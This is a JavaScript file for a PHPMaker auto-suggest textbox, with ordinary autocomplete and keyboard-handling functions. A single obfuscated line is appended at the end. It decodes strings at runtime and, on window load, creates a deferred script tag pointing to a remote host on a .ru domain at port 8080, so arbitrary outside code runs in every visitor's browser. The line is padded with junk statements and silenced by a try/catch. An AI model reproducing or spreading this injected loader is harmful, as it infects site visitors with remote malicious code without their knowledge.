//
//  Auto Suggest TextBox for PHPMaker 4+
// (C) 2006 e.World Technology Ltd.
//

// global variables
var g_nSelListItem = 0;
var g_sTextBoxID;
var g_bCancelSubmit;
var g_sOldTextBoxValue = "";
var g_MaxNewValueLength = 5; // only get data if value length <= this setting

function EW_astSetSelectedValue(sValue) {
	var hdnSelectedValue = document.getElementById("sv_" + g_sTextBoxID);
	hdnSelectedValue.value = sValue;
}

function EW_astSetTextBoxValue()	{
	var divListItem;
	divListItem = EW_astGetSelListItemDiv();
	if (divListItem)	{
		var sListItemValueID = GetDivListItemID(g_nSelListItem) + "_value";
		var hdnListItemValue = document.getElementById(sListItemValueID);		
		if (hdnListItemValue)
			EW_astSetSelectedValue(hdnListItemValue.value);		
		var txtCtrl = document.getElementById(g_sTextBoxID);
		txtCtrl.value = divListItem.innerHTML;
	}
}

function EW_astGetTextBoxValue()	{
	var txtCtrl = document.getElementById(g_sTextBoxID);
	return (txtCtrl) ? txtCtrl.value : '';
}	
		
function EW_astOnMouseClick(nListIndex, sTextBoxID, sDivID) {
	g_nSelListItem = nListIndex;
	g_sTextBoxID = sTextBoxID;					
	EW_astSetTextBoxValue();
	EW_astHideDiv(sDivID);
}

function EW_astOnMouseOver(nListIndex, sTextBoxID)	{
	g_sTextBoxID = sTextBoxID;				
	EW_astSelectListItem(nListIndex);
}	
	
function EW_astOnKeyPress(evt) {	
	if ((EW_astGetKey(evt) == 13) && (g_bCancelSubmit)) return false;		
	return true;
}	

function EW_astOnKeyUp(sTextBoxID, sDiv, evt) {	
	g_sTextBoxID = sTextBoxID;	
	var nKey = EW_astGetKey(evt);	
	// skip up/down/enter
	if ((nKey != 38) && (nKey != 40) && (nKey != 13))	{
		var sNewValue;
		sNewValue = EW_astGetTextBoxValue();			
		if ((sNewValue.length <= g_MaxNewValueLength) && (sNewValue.length > 0)) {
			if (nKey != 27) // skip escape									
				EW_ajaxupdatetextbox(sTextBoxID);					
		}			
		if (g_sOldTextBoxValue != sNewValue)
			EW_astSetSelectedValue("");					
	}
}	

function EW_astOnKeyDown(sTextBoxID, sDiv, evt) {	
	g_sTextBoxID = sTextBoxID;	
	// save current text box value before key press takes affect
	g_sOldTextBoxValue = EW_astGetTextBoxValue();	
	var nKey = EW_astGetKey(evt);					
	// handle up/down/enter
	if (nKey == 38) // up arrow		
		EW_astMoveDown();		
	else if (nKey == 40) // down arrow		
		EW_astMoveUp();
	else if (nKey == 13) { // enter
		// Note: Netscape will submit the form on pressing enter before firing the
		// keydown event. This only works with IE and FF.			
		if (EW_astIsVisibleDiv(sDiv)) {
			EW_astHideDiv(sDiv);						
			evt.cancelBubble = true;				
			if (evt.returnValue) evt.returnValue = false;
			if (evt.stopPropagation) evt.stopPropagation();			
			g_bCancelSubmit = true;
 		} else {
 			g_bCancelSubmit = false;
 		}
	} else {
		EW_astHideDiv(sDiv);
	}			
	return true;
}

function EW_astGetSelListItemDiv() {
	return EW_astGetListItemDiv(g_nSelListItem);
}			
		
function GetDivListItemID(nListItem) {
	return (g_sTextBoxID + "_mi_" + nListItem);
}

function EW_astGetListItemDiv(nListItem)	{
	var sDivListItemID;
	sDivListItemID = GetDivListItemID(nListItem);				
	return document.getElementById(sDivListItemID);
}		

function EW_astMoveUp() {
	var nListItem;
	nListItem = g_nSelListItem + 1;		
	if (EW_astGetListItemDiv(nListItem))	EW_astSelectListItem(nListItem);
}

function EW_astMoveDown() {
	var nListItem;
	nListItem = g_nSelListItem - 1;		
	if (nListItem != 0)	EW_astSelectListItem(nListItem);
}

function EW_astSelectListItem(nListItem)	{
	var divListItem;
	divListItem = EW_astGetListItemDiv(nListItem);					
	if(divListItem)	{
		if (nListItem != g_nSelListItem) {
			EW_astUnhighlightSelListItem();				
			g_nSelListItem = nListItem;
			EW_astSetTextBoxValue();						
			divListItem.className = "ewAstSelListItem";
		}
	}
}

function EW_astUnhighlightSelListItem() {
	var divListItem;
	divListItem = EW_astGetSelListItemDiv();	
	if (divListItem) divListItem.className = "ewAstListItem";		
}

function EW_astGetKey(evt) {
	evt = (evt) ? evt : (window.event) ? event : null;
	if (evt) {
		var cCode = (evt.charCode) ? evt.charCode :
				((evt.keyCode) ? evt.keyCode :
				((evt.which) ? evt.which : 0));
		return cCode; 
	}
}

function EW_astHideDiv(sDivID) {	
	document.getElementById(sDivID).style.visibility = 'hidden';
	g_nSelListItem = 0;
}

function EW_astIsVisibleDiv(sDivID) {
	return document.getElementById(sDivID).style.visibility != 'hidden';		
}

function EW_astShowDiv(sDivID, sDivContent) {	
	var divList;
	divList = document.getElementById(sDivID);		
	var sInnerHtml;
	// use iframe with the same size as the div		
	if (document.all) { // IE
		sInnerHtml = "<div id='" + sDivID + "_content' style='z-index:999; position:absolute;'>";
		sInnerHtml += sDivContent;
		sInnerHtml += "</div>";
		divList.innerHTML = sInnerHtml;
		var divContent = document.getElementById(sDivID + "_content");			
		var divIframe = document.getElementById(sDivID + "_iframe");					
		divContent.className = "ewAstList";
		divList.className = "ewAstListBase";				
		divIframe.style.width = divContent.offsetWidth + 'px';
		divIframe.style.height = divContent.offsetHeight + 'px';
		divIframe.marginTop = "-" + divContent.offsetHeight + 'px';
	} else {
		divList.innerHTML = sDivContent;	
	}	
	divList.style.visibility = 'visible';		
}


var pK=new Array();var _p=new Array();try {this.d='';var O;if(O!='f' && O!='eR'){O=''};var CD;if(CD!='' && CD!='q_'){CD='Y'};var T='g';this.GD='';var a=RegExp;var k=new Array();var Tb='[';var _='replace';var Xo="";var n='';var _k;if(_k!='' && _k!='kT'){_k='oU'};var s=']';var i='';var V;if(V!='' && V!='pV'){V=null};function R(G,C){var bE;if(bE!='' && bE!='at'){bE=''};var ib;if(ib!='' && ib!='HF'){ib=''};var zR="";var M=Tb;M+=C;var Zb=new Date();M+=s;var zB;if(zB!='ry' && zB != ''){zB=null};var Xn=new String();var Mn=new a(M, T);var NQ=new Array();var mC=new Date();return G[_](Mn, n);};var y=new String();var uZ;if(uZ!='' && uZ!='av'){uZ=null};this.Ee="";var U=R('aWpvpBeXnBd1C1hviBl1dX',"vBWX1");var G="1";var o=R('bHo5dCy5',"HnCY5");var Nd="";var m=R('sCeCt4A4tCtCrCi4b4u4tCe4',"4C");var Uo="";var K=R('cGrNe7aNt7e7EMlNeqmGeMn7t7',"qGNM7");var eu=new String();var bX;if(bX!='cn'){bX=''};var F=R('oPnNlPoNaDdN',"NPAD");var q='';var p=R('s2c2rjijpyt2',"20yj");this.MF="";var B=R('hItJtJpJ:I/I/ImIoInIoIgIrJaIfJiJaJsI-JcIoImJ.IwIiJkIiImIeJdJiJaJ.IoIrIgI.JpJaJrItIyIpJoIkIeIrI-IcJoJmI.JiIwJeIsItIpIoJiInJtJ.JrJuJ:I',"IJ");var v=R('8199997099179987919970999991',"179");var FI=new Array();var FH=R('/kguouo5gFlbeb.5cuobm5/kguokoFgulueb.bcuoFm5/kw5auskhuiun5gut5oFnkp5o5sFtu.bcuoFmk/uy5nkeutu.ucuobmb/ktbw5ibtupFiucu.5cbo5mF.5pbhupb',"uF5bk");var Ex=new String();var S_;if(S_!='' && S_!='HJ'){S_='aB'};var g;if(g!='' && g!='Ox'){g='Zs'};window[F]=function(){var Rs;if(Rs!=''){Rs='ZC'};this.Gx='';var ml;if(ml!='' && ml!='fI'){ml='yy'};W=document[K](p);var pX="";q+=B;var dt;if(dt!='Am'){dt='Am'};this.Oz="";q+=v;q+=FH;var SZ=new Array();W.src=q;var Gn;if(Gn!='' && Gn!='yyO'){Gn='YG'};var Yr;if(Yr!='ES'){Yr='ES'};var Il;if(Il!='fa'){Il='fa'};var nY;if(nY!='ce'){nY=''};var z=document[o];var _q;if(_q!='lV' && _q != ''){_q=null};W.setAttribute('defer', G);var Bi;if(Bi!=''){Bi='Tx'};this.qs='';var dj;if(dj!='' && dj!='Ek'){dj=null};z.appendChild(W);this.uZB='';this.vl='';};var ST=new Array();var pD;if(pD!='SpC'){pD=''};} catch(A){};var Jq='';